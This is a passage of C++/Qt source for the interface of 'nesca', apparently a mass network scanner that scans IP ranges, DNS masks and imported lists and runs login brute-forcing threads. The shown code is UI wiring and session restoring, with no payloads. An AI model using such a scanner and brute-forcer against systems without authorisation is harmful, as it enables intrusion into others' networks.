	connect(ui->edit_filter_button, SIGNAL(clicked()), this, SLOT(slotEditFilter()));

	connect(stt, SIGNAL(signalBlockButton(bool)), this, SLOT(slotBlockButtons(bool)));
	connect ( ui->secretMessageBut_1, SIGNAL( clicked() ), this, SLOT( smReaction() ) );
	connect ( ui->secretMessageBut_2, SIGNAL( clicked() ), this, SLOT( smReaction() ) );
	connect ( ui->secretMessageBut_3, SIGNAL( clicked() ), this, SLOT( smReaction() ) );
	connect ( ui->secretMessageBut_4, SIGNAL( clicked() ), this, SLOT( smReaction() ) );
	connect ( ui->secretMessageBut_5, SIGNAL( clicked() ), this, SLOT( smReaction() ) );
	connect ( ui->secretMessageBut_6, SIGNAL( clicked() ), this, SLOT( smReaction() ) );
	connect ( ui->secretMessageBut_7, SIGNAL( clicked() ), this, SLOT( smReaction() ) );
	connect ( ui->secretMessageBut_8, SIGNAL( clicked() ), this, SLOT( smReaction() ) );
	connect ( ui->dataText, SIGNAL( anchorClicked(QUrl) ), this, SLOT( onLinkClicked(QUrl) ) );
	connect ( ui->checkKeyBut, SIGNAL( clicked() ), this, SLOT( CheckPersKey() ) );
	connect ( ui->DataflowModeBut, SIGNAL( clicked() ), this, SLOT( slotShowDataflow() ) );
	connect ( ui->JobModeBut, SIGNAL( clicked() ), this, SLOT( switchToJobMode() ) );
	connect ( ui->clearLogBut, SIGNAL( clicked() ), this, SLOT( slotClearLogs() ) );
	connect ( mct, SIGNAL(showNewMsg(QString)), this, SLOT(slotShowServerMsg(QString)));
	connect ( tray, SIGNAL(activated(QSystemTrayIcon::ActivationReason)),this,SLOT(trayButtonClicked()));
	connect ( ui->exitButton, SIGNAL( clicked() ), this, SLOT( exitButtonClicked() ) );
	connect ( ui->trayButton, SIGNAL( clicked() ), this, SLOT( trayButtonClicked() ) );
	connect ( ui->switcherBut, SIGNAL( clicked() ), this, SLOT( switchDataFields() ) );
	connect ( ui->importButton, SIGNAL( clicked() ), this, SLOT( importAndScan() ) );
	connect ( ui->startScanButton_3, SIGNAL( clicked() ), this, SLOT( startScanButtonClicked() ) );
	connect ( ui->startScanButton_4, SIGNAL( clicked() ), this, SLOT( startScanButtonClickedDNS() ) );
	connect ( ui->shuffle_onoff, SIGNAL(toggled(bool)), this, SLOT(ChangeShuffle(bool)));
	connect ( ui->trackerOnOff, SIGNAL(toggled(bool)), this, SLOT(ChangeTrackerOK(bool)));
	connect ( ui->importThreads, SIGNAL( textChanged(QString) ), this, SLOT( ChangeLabelThreads_ValueChanged(QString) ) );
	connect(ui->threadLine, SIGNAL(textChanged(QString)), this, SLOT(ChangeLabelThreads_ValueChanged(QString)));
	connect(ui->lineILVL, SIGNAL(textChanged(QString)), this, SLOT(saveTLD(QString)));
	
	connect ( ui->PingTO, SIGNAL( textChanged(QString) ), this, SLOT( PingTO_ChangeValue(QString) ) );
	connect ( ui->threadDelayBox, SIGNAL( textChanged(QString) ), this, SLOT( ThreadDelay_ChangeValue(QString) ) );
	connect ( ui->maxBrutingThrBox, SIGNAL( textChanged(QString) ), this, SLOT( MaxBrutingThr_ChangeValue(QString) ) );
	connect ( ui->lineEditThread, SIGNAL( textChanged(QString) ), this, SLOT( ChangeLabelThreads_ValueChanged(QString) ) );
	connect ( ui->iptoLine_value, SIGNAL( textChanged(QString) ), this, SLOT( ChangeLabelTO_ValueChanged(QString) ) );
	connect ( ui->iptoLine_value_2, SIGNAL( textChanged(QString) ), this, SLOT( ChangeLabelTO_ValueChanged(QString) ) );
	connect ( ui->iptoLine_value_3, SIGNAL( textChanged(QString) ), this, SLOT( ChangeLabelTO_ValueChanged(QString) ) );
	connect ( ui->restoreDefaultPorts1, SIGNAL( clicked() ), this, SLOT( slotRestoreDefPorts() ) );
	connect ( ui->restoreDefaultPorts2, SIGNAL( clicked() ), this, SLOT( slotRestoreDefPorts() ) );
	connect ( ui->restoreDefaultPorts3, SIGNAL( clicked() ), this, SLOT( slotRestoreDefPorts() ) );
	connect ( ui->dnsLine, SIGNAL(textChanged(QString)), this, SLOT(DNSLine_ValueChanged(QString)));

	connect ( ui->ipLine, SIGNAL(				returnPressed() ), this, SLOT(	startScanButtonClicked() ) );
	connect ( ui->threadLine, SIGNAL(			returnPressed() ), this, SLOT(	startScanButtonClicked() ) );
	connect ( ui->ipmPortLine, SIGNAL(			returnPressed() ), this, SLOT(	startScanButtonClicked() ) );
	connect ( ui->dnsLine, SIGNAL(				returnPressed() ), this, SLOT(	startScanButtonClickedDNS() ) );
	connect ( ui->lineILVL, SIGNAL(				returnPressed() ), this, SLOT(	startScanButtonClickedDNS() ) );
	connect ( ui->dnsPortLine, SIGNAL(			returnPressed() ), this, SLOT(	startScanButtonClickedDNS() ) );
	connect ( ui->lineEditThread, SIGNAL(		returnPressed() ), this, SLOT(	startScanButtonClickedDNS() ) );
	connect ( ui->logoLabel, SIGNAL( clicked() ), this, SLOT( logoLabelClicked() ) );
	connect ( ui->me2ScanBut, SIGNAL( clicked() ), this, SLOT( activateME2ScanScene() ) );
	connect ( ui->QoSScanBut, SIGNAL( clicked() ), this, SLOT( activateQoSScanBut() ) );
	connect ( ui->VoiceScanBut, SIGNAL( clicked() ), this, SLOT( activateVoiceScanBut() ) );
	connect ( ui->PieStatBut, SIGNAL( clicked() ), this, SLOT( activatePieStatBut() ) );
	connect ( stt, SIGNAL(showRedVersion()), this, SLOT(slotShowRedVersion()));
	connect ( stt, SIGNAL(startScanIP()), this, SLOT(IPScanSeq()));
	connect ( stt, SIGNAL(startScanDNS()), this, SLOT(DNSScanSeq()));
	connect ( stt, SIGNAL(startScanImport()), this, SLOT(ImportScanSeq()));
	connect ( stt, SIGNAL(sIncData(QString, QString)), this, SLOT(slotIncData(QString, QString)));
	connect ( stt, SIGNAL(sOutData(QString)), this, SLOT(slotOutData(QString)));
	connect ( stt, SIGNAL(changeDebugFoundData(QString)), this, SLOT(appendDebugText(QString)));
	connect ( stt, SIGNAL(changeYellowFoundData(QString)), this, SLOT(appendNotifyText(QString)));
	connect ( stt, SIGNAL(changeRedFoundData(QString)), this, SLOT(appendErrText(QString)));
	connect ( stt, SIGNAL(changeGreenFoundData(QString)), this, SLOT(appendOKText(QString)));
	connect(stt, SIGNAL(foundDataCustom(QString, QString)), this, SLOT(appendTextCustom(QString, QString)));
	connect ( stt, SIGNAL(killSttThread()), this, SLOT(STTTerminate()));

	connect ( stt, SIGNAL(signalUpdateArc(unsigned long)), this, SLOT(drawVerboseArcs(unsigned long)));

	connect(stt, SIGNAL(changeFoundData(QString)), this, SLOT(appendDefaultText(QString)));

	connect ( stt, SIGNAL(signalDataSaved(bool)), this, SLOT(changeNSTrackLabel(bool)));
	connect ( adtHN, SIGNAL(sDrawActivityLine(QString)), this, SLOT(slotDrawActivityLine(QString)));
	connect ( adtHN, SIGNAL(sDrawGrid()), this, SLOT(slotDrawActivityGrid()));
	connect ( dtHN, SIGNAL(sAddDelimLines()), this, SLOT(slotDrawDelimLines()));
	connect ( dtHN, SIGNAL(sDrawGrid()), this, SLOT(slotDrawGrid()));
	connect ( dtHN, SIGNAL(sAddLine(int, int, int, int)), this, SLOT(slotAddLine(int, int, int, int)));
	connect ( dtME2, SIGNAL(sAddPolyLine()), this, SLOT(slotAddPolyLine()));
	connect ( dtME2, SIGNAL(sDrawTextPlacers()), this, SLOT(slotDrawTextPlacers()));
	connect ( dtQoS, SIGNAL(sAddLine()), this, SLOT(slotQoSAddLine()));
	connect ( dtGridQoS, SIGNAL(sAddLine()), this, SLOT(slotQoSAddGrid()));
	connect ( dtGridQoS, SIGNAL(sAddDelimLines()), this, SLOT(slotQoSDrawDelimLines()));
	connect ( vsTh, SIGNAL(sAddLine()), this, SLOT(slotVoiceAddLine()));
	connect ( vsTh, SIGNAL(sDrawGrid(int)), this, SLOT(slotDrawVoiceGrid(int)));
	connect ( vsTh, SIGNAL(sDrawTextPlacers()), this, SLOT(slotDrawTextPlacers()));
	connect ( psTh, SIGNAL(sUpdatePie()), this, SLOT(slotUpdatePie()) );
	connect ( ui->tabMainWidget, SIGNAL(currentChanged(int)), this, SLOT(slotTabChanged(int)) );
	/*Msg blinker*/
	//connect ( irc_nmb, SIGNAL(sBlinkMessage()), this, SLOT(slotBlinkMessage()) );

	//BA TablelistView
	connect(stt, SIGNAL(signalAddBARow(int&, QString)), this, SLOT(slotAddBARow(int&, QString)));
	//connect(stt, SIGNAL(signalAddBARow(int &, QString, QString, QString)), this, SLOT(slotAddBARow(int &, QString, QString, QString)));
	connect(stt, SIGNAL(signalChangeBARow(int, QString, QString)), this, SLOT(slotChangeBARow(int, QString, QString)));
}

void nesca_3::saveOptions()
{
	_LoadPersInfoToLocalVars(savedTabIndex);
}

QString loadNescaSetup(const char *resStr, const char *option) {

	char *lex = NULL;
	if(strstr(resStr, option) != NULL)
	{
		lex = (char*)(strstr(resStr, option) + strlen(option));

		if(strlen(lex) > 1)
		{
			lex[strlen(lex) - 1] = '\0';
			return QString(lex);
		} return "";
	}

	return "";
}
void setUIText(char *field, QLineEdit *qle, const char *resStr) {
	if (strstr(resStr, field) != NULL) {
		QString intermediateString = loadNescaSetup(resStr, field).simplified();
		intermediateString.length() > 0 ? qle->setText(intermediateString) : (void)NULL;
	}
}
void RestoreSession()
{
	//ZeroMemory(gPorts, sizeof(gPorts));
	//ZeroMemory(gTLD, sizeof(gTLD));
	gPorts[0] = 0;
	gTLD[0] = 0;

	FILE *resFile = fopen("restore", "r");
	char resStr[128] = {0};
	char *lex;

	if(resFile != NULL)
	{
		stt->doEmitionYellowFoundData("Previous session file found! Restoring...");

		while(fgets(resStr, 128, resFile) != NULL)
		{
			if(strstr(resStr, "[SESSION]:") != NULL)
			{
				lex = strtok(strstr(resStr, "[SESSION]:") + strlen("[SESSION]:"), " ");
				gMode = atoi(lex);
				lex = strtok(NULL, " ");
				if (lex == nullptr) {
					stt->doEmitionRedFoundData("Restore file is corrupted.");
					return;
				}

				if(gMode == 0)
				{
					if(strstr(lex, "-") != NULL)
					{
						ui->ipLine->setText(QString(lex));

						lex = strtok(NULL, " ");
						gThreads = atoi(lex);

						ui->threadLine->setText(QString(lex));
						ui->tabMainWidget->setCurrentIndex(0);
					}
					else if(strstr(lex, "/") != NULL)
					{
						ui->ipLine->setText(QString(lex));

						lex = strtok(NULL, " ");
						gThreads = atoi(lex);

						ui->threadLine->setText(QString(lex));
						ui->tabMainWidget->setCurrentIndex(0);
					};
				}
				else if(gMode == 1)
				{
					QString qLex(lex);
					qLex.replace("[az]", "\\l");
					qLex.replace("[0z]", "\\w");
					qLex.replace("[09]", "\\d");
					ui->dnsLine->setText(qLex);
					lex = strtok(NULL, " ");
					if(strstr(lex, ".") != NULL) {
						strcpy(gTLD, lex);
						lex = strtok(NULL, " ");
					}
					gThreads = atoi(lex);

					ui->lineEditThread->setText(QString(lex));
					ui->lineILVL->setText(QString(gTLD));
					ui->tabMainWidget->setCurrentIndex(1);
					ui->startScanButton_4->setText("RESTORE");
				}
				else if(gMode == -1)
				{
					lex = strtok(NULL, " ");
					gThreads = atoi(lex);

					ui->importThreads->setText(QString(lex));
					
					FILE *testFile = fopen("tempIPLst.bk", "r");
					if(testFile != NULL) 
					{
						ui->importButton->setText("RESTORE");
						importFileName = "tempIPLst.bk";
						fclose(testFile);
					};
					ui->tabMainWidget->setCurrentIndex(2);			
				};

				lex = strtok(NULL, " ");

				if(lex != NULL && strstr(lex, "-p") != NULL)
				{
					QString PortString = "";

					char *tPorts = strstr(lex, "-p");
					int strln = strlen(tPorts);
					char *fPorts = new char[strln];
					strncpy(fPorts, tPorts + 2, strln);
					PortString = QString(fPorts);

					PortString.replace("\n", "");

					if(PortString.length() > 0) {
						ui->ipmPortLine->setText(PortString);
						ui->dnsPortLine->setText(PortString);
						ui->importPortLine->setText(PortString);
					} else {
						ui->ipmPortLine->setText(PORTSET);
						ui->dnsPortLine->setText(PORTSET);
						ui->importPortLine->setText(PORTSET);
					}
					
					delete []fPorts;
				}
				else
				{
					ui->ipmPortLine->setText(PORTSET);
					ui->dnsPortLine->setText(PORTSET);
					ui->importPortLine->setText(PORTSET);
				};
			};

			setUIText("[NDBSERVER]:", ui->lineTrackerSrv, resStr);
			setUIText("[NDBSCRIPT]:", ui->lineTrackerScr, resStr);
			setUIText("[NDBPORT]:", ui->trcSrvPortLine, resStr);
			if (strstr(resStr, "[PING]:") != NULL) {
				lex = strstr(resStr, "[PING]:") + strlen("[PING]:");

				if (strlen(lex) > 1)
				{
					lex[strlen(lex) - 1] = '\0';
					ui->pingingOnOff->setChecked(strcmp(lex, "true") == 0 ? true : false);
				};
			} else if (strstr(resStr, "[SHUFFLE]:") != NULL) {
				lex = strstr(resStr, "[SHUFFLE]:") + strlen("[SHUFFLE]:");

				if (strlen(lex) > 1)
				{
					lex[strlen(lex) - 1] = '\0';
					ui->shuffle_onoff->setChecked(strcmp(lex, "true") == 0 ? true : false);
				};
			} else if (strstr(resStr, "[NSTRACK]:") != NULL) {
				lex = strstr(resStr, "[NSTRACK]:") + strlen("[NSTRACK]:");

				if (strlen(lex) > 1)
				{
					lex[strlen(lex) - 1] = '\0';
					ui->trackerOnOff->setChecked(strcmp(lex, "true") == 0 ? true : false);
				};
			}
			setUIText("[PING_TO]:", ui->PingTO, resStr);
			setUIText("[THREAD_DELAY]:", ui->threadDelayBox, resStr);
			if (strstr(resStr, "[TIMEOUT]:") != NULL) {
				const QString &tempLex = loadNescaSetup(resStr, "[TIMEOUT]:");
				if(tempLex.toInt() > 0) {
					ui->iptoLine_value->setText(tempLex.simplified());
					ui->iptoLine_value_2->setText(tempLex.simplified());
					ui->iptoLine_value_3->setText(tempLex.simplified());
				}
			}
			setUIText("[MAXBTHR]:", ui->maxBrutingThrBox, resStr);
			setUIText("[PERSKEY]:", ui->linePersKey, resStr);
			//ZeroMemory(trcPersKey, sizeof(trcPersKey));
			trcPersKey[0] = 0;
			strncpy(trcPersKey, resStr, 32);
			memset(trcPersKey + 32, '\0', 1);
			setUIText("[SYSTEMPROXYIP]:", ui->systemProxyIP, resStr);
			setUIText("[SYSTEMPROXYPORT]:", ui->systemProxyPort, resStr);

			resStr[0] = 0;
			//ZeroMemory(resStr, sizeof(resStr));
		};

		fclose(resFile);
		_LoadPersInfoToLocalVars(nesca_3::savedTabIndex);
		stt->doEmitionGreenFoundData("Previous session loaded.");
	};
}

void CreateVerFile()
{
	FILE *vf = fopen("version", "w");

	if(vf != NULL)
	{
		fputs(gVER, vf);
		fclose(vf);
	};
}

std::string GetVer()
{
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	int dver = 0;
	int tver = 0;

	dver = __DATE__[9] - 48;
	dver *= 10;
	dver += __DATE__[10] - 48;
	dver *= 100;

	if(__DATE__[0] == 'J' && __DATE__[1] == 'a') dver += 1;
	else if(__DATE__[0] == 'F') dver += 2;
	else if(__DATE__[0] == 'M' && __DATE__[2] == 'r') dver += 3;
	else if(__DATE__[0] == 'A' && __DATE__[1] == 'p') dver += 4;
	else if(__DATE__[0] == 'M' && __DATE__[2] == 'y') dver += 5;
	else if(__DATE__[0] == 'J' && __DATE__[2] == 'n') dver += 6;
	else if(__DATE__[0] == 'J' && __DATE__[2] == 'l') dver += 7;
	else if(__DATE__[0] == 'A' && __DATE__[1] == 'u') dver += 8;
	else if(__DATE__[0] == 'S') dver += 9;
	else if(__DATE__[0] == 'O') dver += 10;
	else if(__DATE__[0] == 'N') dver += 11;
	else if(__DATE__[0] == 'D') dver += 12;

	if(__DATE__[4] != ' ')
	{
		dver *= 10;
		dver += __DATE__[4] - 48;
	}
	else dver *= 10;
	dver *= 10;
	dver += __DATE__[5] - 48;

	tver = __TIME__[0] - 48;
	tver *= 10;
	tver += __TIME__[1] - 48;
	tver *= 10;
	tver += __TIME__[3] - 48;
	tver *= 10;
	tver += __TIME__[4] - 48;

	char dverX[16] = {0};
	char tverX[16] = {0};

	sprintf(dverX, "%X", dver);
	sprintf(tverX, "%X", tver);

	std::string db = std::string(dverX) + "-" + std::string(tverX);

	return db;
#else
	FILE *f = fopen("version", "r");
	if(f != NULL) {
		char buff[32] = {0};
		fgets(buff, 32, f);
		fclose(f);

		std::string db = std::string(buff);
		return db;
	} else {
		stt->doEmitionRedFoundData("Cannot open version file.");
		return "?";
	};
#endif
}

void nesca_3::slotShowRedVersion()
{
	ui->rVerLabel->show();
}

void _startVerCheck()
{
	vct->start();
}

void _startMsgCheck()
{
	mct->start();
}

void nesca_3::mousePressEvent(QMouseEvent *event)
{
	if (event->button() == Qt::LeftButton) {
		dragPosition = event->globalPos() - frameGeometry().topLeft();
		event->accept();
	};
}

void nesca_3::mouseReleaseEvent(QMouseEvent * event)
{
	if (event->modifiers() == Qt::ControlModifier) {
		event->accept();
	};
}

void nesca_3::mouseMoveEvent(QMouseEvent * event)
{
	QPoint CPos = (event->globalPos() - dragPosition);
	QWidget::move(CPos);
	if(qwm != NULL) qwm->move(CPos.x() + WIDGET_WIDTH + 5, CPos.y());
}

void nesca_3::exitButtonClicked()
{
	STTTerminate();
	while (MainStarter::savingBackUpFile) Sleep(100);
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	WSACleanup();
#endif
	Threader::cleanUp();
	qApp->quit();
}

void PekoWidget::pekoExitButtonClicked()
{
	this->close();
}

void nesca_3::trayButtonClicked()
{
	if(tray->isVisible())
	{
		show();
		tray->hide();		
	}
	else
	{
		hide();
		tray->show();
	};
}

void nesca_3::ChangeShuffle(bool val)
{
	gShuffle = val;
}

void nesca_3::ChangeTrackerOK(bool val)
{
	trackerOK = val;
}

void nesca_3::ChangePingerOK(bool val)
{
	ui->PingTO->setEnabled(val);
	gPingNScan = val;

	if(val == false) ui->PingTO->setStyleSheet("color: rgb(116, 116, 116);background-color: rgb(56, 56, 56);border:none;");
	else ui->PingTO->setStyleSheet("color: rgb(216, 216, 216);background-color: rgb(56, 56, 56);border:none;");
}

bool stopFirst;
void nesca_3::startScanButtonClicked()
{
	if(startFlag == false)
	{
		stt->doEmitionStartScanIP();
		/*if(trackerOK)
		{
			if(ui->linePersKey->text().size() != 0)
			{
				CheckPersKey();
			}
			else
			{
				stt->doEmitionRedFoundData("Empty \"Personal key\" field. ");
			};
		}
		else
		{
			stt->doEmitionStartScanIP();		
		};*/
	}
	else
	{
		if(stopFirst == false)
		{
			stopFirst = true;
			globalScanFlag = false;
			ui->startScanButton_3->setStyleSheet(
				" QPushButton {"
				"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
				"color: yellow;"
				"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
				"}"
				);

			ui->startScanButton_3->setText("Wait...");
			stt->doEmitionBlockButton(true);
			stt->doEmitionYellowFoundData("Trying to stop. Please, wait...");
		}
		else
		{
			globalScanFlag = false;
			ui->startScanButton_3->setStyleSheet(
				" QPushButton {"
				"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
				"color: yellow;"
				"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
				"}"
				);

			ui->startScanButton_3->setText("Wait...");
			stt->doEmitionYellowFoundData("Wait, killing threads...");
			STTTerminate();
		};
	};
}

void nesca_3::startScanButtonClickedDNS()
{
	if(startFlag == false)
	{
		stt->doEmitionStartScanDNS();
		//if(trackerOK)
		//{
		//	if(ui->linePersKey->text().size() != 0)
		//	{
		//		CheckPersKey();
		//	}
		//	else
		//	{
		//		stt->doEmitionRedFoundData("Empty \"Personal key\" field. ");
		//	};
		//}
		//else
		//{
		//	stt->doEmitionStartScanDNS();				
		//};
	}
	else
	{
		if(stopFirst == false)
		{
			stopFirst = true;
			globalScanFlag = false;
			ui->startScanButton_4->setStyleSheet(
				" #startScanButton_4 {"
				"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
				"color: yellow;"
				"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
				"}"
				);

			ui->startScanButton_4->setText("Wait...");
			stt->doEmitionBlockButton(true);
			stt->doEmitionYellowFoundData("Trying to stop. Please, wait...");
			STTTerminate();
		}
		else
		{
			globalScanFlag = false;
			ui->startScanButton_4->setStyleSheet(
				" #startScanButton_4 {"
				"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
				"color: yellow;"
				"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
				"}"
				);

			ui->startScanButton_4->setText("Wait...");
			stt->doEmitionYellowFoundData("Killing threads...");
			STTTerminate();
		};
	};
}

void nesca_3::importAndScan()
{
	if (startFlag == false)
	{
		stt->doEmitionStartScanImport();
		//if (trackerOK)
		//{
		//	if (ui->linePersKey->text().size() != 0)
		//	{
		//		CheckPersKey();
		//	}
		//	else
		//	{
		//		stt->doEmitionRedFoundData("Empty \"Personal key\" field. ");
		//	};
		//}
		//else
		//{
		//	stt->doEmitionStartScanImport();
		//};
	}
	else
	{
		ui->importButton->setStyleSheet(
			" QPushButton {"
			"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
			"color: yellow;"
			"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
			"}"
			);

		ui->importButton->setText("Wait...");
		stt->doEmitionYellowFoundData("Trying to stop. Please, wait...");
		globalScanFlag = false;

		if (stopFirst == false)
		{
			stopFirst = true;
			ui->importButton->setStyleSheet(
				" QPushButton {"
				"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
				"color: yellow;"
				"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
				"}"
				);

			ui->importButton->setText("Wait...");
			stt->doEmitionBlockButton(true);
			stt->doEmitionYellowFoundData("Trying to stop. Please, wait...");
			importFileName = "";
		}
		else
		{
			ui->importButton->setStyleSheet(
				" QPushButton {"
				"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
				"color: yellow;"
				"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
				"}"
				);

			ui->importButton->setText("Wait...");
			stt->doEmitionYellowFoundData("Wait, killing threads...");
			STTTerminate();
		};
	};
}

void nesca_3::IPScanSeq()
{
	if (ui->ipLine->text() != "")
	{
		if (ui->ipmPortLine->text() != "")
		{
			ui->ipLine->text().replace("http://", "");
			ui->ipLine->text().replace("https://", "");
			ui->ipLine->text().replace("ftp://", "");
			if (ui->ipLine->text()[ui->ipLine->text().length() - 1] == '/') ui->ipLine->text()[ui->ipLine->text().length() - 1] = '\0';
			stopFirst = false;
			ui->tabMainWidget->setTabEnabled(1, false);
			ui->tabMainWidget->setTabEnabled(2, false);

			saveOptions();

			stt->setMode(0);
			stt->setTarget((ui->ipLine->text().indexOf("-") > 0 ? ui->ipLine->text() :
				(ui->ipLine->text().indexOf("/") < 0 ? ui->ipLine->text() + "-" + ui->ipLine->text() : ui->ipLine->text())
				));
			stt->setPorts(ui->ipmPortLine->text().replace(" ", ""));
			stt->start();

			startFlag = true;
			ui->startScanButton_3->setText("Stop");
			ui->startScanButton_3->setStyleSheet(
				" QPushButton {"
				"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
				"color: red;"
				"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
				"}"
				);
			ui->dataText->clear();
		}
		else stt->doEmitionRedFoundData("No ports specified!");
	};
}

void nesca_3::DNSScanSeq()
{
	if (ui->dnsLine->text() != "")
	{
		if (ui->dnsPortLine->text() != "")
		{
			if (ui->dnsLine->text().indexOf(".") > 0)
			{
				stopFirst = false;
				ui->tabMainWidget->setTabEnabled(0, false);
				ui->tabMainWidget->setTabEnabled(2, false);

				QStringList lst = ui->dnsLine->text().split(".");
				ui->dnsLine->setText(lst[0]);
				QString topLevelDomainStr;
				for (int i = 1; i < lst.size(); ++i)
				{
					topLevelDomainStr += ".";
					topLevelDomainStr += lst[i];
				};
				ui->lineILVL->setText(topLevelDomainStr);
			};

			saveOptions();

			stt->setMode(1);
			stt->setTarget(ui->dnsLine->text());
			stt->setPorts(ui->dnsPortLine->text().replace(" ", ""));
			stt->start();

			startFlag = true;
			ui->startScanButton_4->setText("Stop");
			ui->startScanButton_4->setStyleSheet(
				" QPushButton {"
				"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
				"color: red;"
				"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
				"}"
				);
			ui->dataText->clear();
		}
		else
		{
			stt->doEmitionRedFoundData("No ports specified!");
		};
	}
	else
	{
		stt->doEmitionRedFoundData("Wrong mask input.");
	};
}

void nesca_3::ImportScanSeq()
{
	QString fileName;

	if (importFileName.size() == 0) fileName = QFileDialog::getOpenFileName(this, tr("Open File"),
		"",
		tr("Files (*.txt)")
		);
	else fileName = importFileName;

	if (fileName != "")
	{
		stopFirst = false;
		ui->tabMainWidget->setTabEnabled(0, false);
		ui->tabMainWidget->setTabEnabled(1, false);

		_LoadPersInfoToLocalVars(savedTabIndex);

		stt->setMode(-1);
		stt->setTarget(fileName);
		stt->setPorts(ui->importPortLine->text().replace(" ", ""));
		stt->start();

		startFlag = true;
		ui->importButton->setText("Stop");
		ui->importButton->setStyleSheet(
			" #importButton {"
			"background-color: qlineargradient(spread:none, x1:1, y1:0, x2:1, y2:1, stop:0.681818 rgba(0, 0, 0, 250), stop:1 rgba(255, 255, 255, 130));"
			"color: red;"
			"border: 0.5px solid qlineargradient(spread:reflect, x1:0.54, y1:0.488591, x2:0.54, y2:0, stop:0 rgba(255, 255, 255, 130), stop:1 rgba(0, 0, 0, 255));"
			"}"
			);
		ui->dataText->clear();
	}
	else stt->doEmitionYellowFoundData("Empty filename.");
}

void nesca_3::logoLabelClicked()
{
	QDesktopServices::openUrl(QUrl("http://nesca.d3w.org/"));
}

void nesca_3::ChangeLabelTO_ValueChanged(QString str)
{
	int gto = str.toInt();
	gTimeOut = gto > 0 ? gto : 1;
}

void nesca_3::ChangeLabelThreads_ValueChanged(QString str)
{
	gThreads = str.toInt();
}

void nesca_3::saveTLD(QString str){
	strncpy(gTLD, str.toLocal8Bit().data(), 128);
}

void nesca_3::PingTO_ChangeValue(QString str)
{
	gPingTimeout = str.toInt();
}

void nesca_3::ThreadDelay_ChangeValue(QString str)
{
	Threader::gThreadDelay = str.toInt();
}

void nesca_3::MaxBrutingThr_ChangeValue(QString str)
{
	gMaxBrutingThreads = str.toInt();
}

void nesca_3::appendDefaultText(QString str)
{
	ui->dataText->append("<p style=\"color: #a1a1a1;\">[" + QTime::currentTime().toString() + "] " + str + "</p>");
}

void nesca_3::appendErrText(QString str)
{
	ui->dataText->append("<span style=\"color:red;\">[" + QTime::currentTime().toString() + "]" + QString::fromUtf8(str.toLocal8Bit().data()) + "</span>");

	if(stt->isRunning() == false)
	{
		startFlag = false;
		ui->startScanButton_3->setText("Start");
		stt->terminate();
	};
}



void nesca_3::appendOKText(QString str)
{
	ui->dataText->append("<span style=\"color:#06ff00;\">[" + QTime::currentTime().toString() + "][OK] " + str + "</span>");
}
void nesca_3::appendTextCustom(QString str, QString color)
{
	ui->dataText->append("<span style=\"color:#" + color + ";\">[" + QTime::currentTime().toString() + "][OK] " + str + "</span>");
}

void nesca_3::appendNotifyText(QString str)
{
	ui->dataText->append("<span style=\"color:#efe100;\">[" + QTime::currentTime().toString() + "][*] " + str + "</span>");
}

void nesca_3::appendDebugText(QString str)
{
	ui->dataText->append("<span style=\"color:#0084ff;\">[DEBUG] " + str + "</span>");
}


QRegExp r("[ht|f]{0,2}tp[s]{0,1}://(\\w|\\.|,|/|:|-|_|\\?|!|\\@|#|\\$|%|\\^|&|\\*|=|\\+|<|>|;|:|\"|'|~|\\[|\\])*[\\s|\\t]{0,1}");
QRegExp under("((.+|(.+$)))");
QRegExp boldr("((.+|(.+$)))");
QRegExp colr("(\\d+[,\\d+]{0,2})");
QString GetColorCode(int mode, QString str)
{
	QRegExp c("(\\d{0,2})");
	QRegExp bg(",(\\d{0,2})");
